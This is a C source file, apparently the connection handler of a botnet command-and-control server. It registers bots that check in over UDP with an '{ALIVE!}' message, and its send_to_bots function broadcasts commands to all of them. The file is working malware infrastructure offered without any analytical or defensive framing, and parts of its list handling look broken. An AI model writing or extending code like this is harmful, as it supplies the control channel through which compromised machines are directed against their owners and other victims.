#include "conn_handler.h"

extern CONNS cons;
extern int main_sock;

int make_socket(void)
{
	int s;
	if((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == ERROR)	{
		perror("Failed to create socket");
		exit(1);
	}
	return s;
}

void *accept_handler(void)
{
	struct connections *connects = &cons;
	char temp[10];
	while(1){
		int addrlen = sizeof(struct sockaddr);
		if(recvfrom(main_sock, temp, 10, 0, (struct sockaddr *)&connects->client_conn, &addrlen) != ERROR){
			if(strncmp(temp, "{ALIVE!}", 8) != 0)
				continue;

			sendto(main_sock, "STARTED", 7, 0, (struct sockaddr *)&connects->client_conn , sizeof(struct sockaddr));
			connects->sock = make_socket();
			connects = connects->next;
		}

	}
	pthread_exit(0);
}

void send_to_bots(char *data)
{
	struct connections *connects = &cons;
	while(connects != NULL){
		int ret = sendto(connects->sock, data, strlen(data)+1, 0, (struct sockaddr *)&connects->client_conn, sizeof(struct sockaddr));
		// DEBUG
		printf("%d\n", ret);
		connects = connects->next;
	}
}

void bind_socket(int sock, short port, struct sockaddr_in *serverAddr)
{
	serverAddr->sin_family = AF_INET;
	serverAddr->sin_port = htons(port);
	serverAddr->sin_addr.s_addr = htonl(INADDR_ANY);
	memset(serverAddr->sin_zero, '\x00', sizeof serverAddr->sin_zero);
	if (bind(sock, (struct sockaddr *)serverAddr, sizeof(struct sockaddr)) == ERROR){
		perror("Failed to bind the Socket");
		exit(1);
	}
}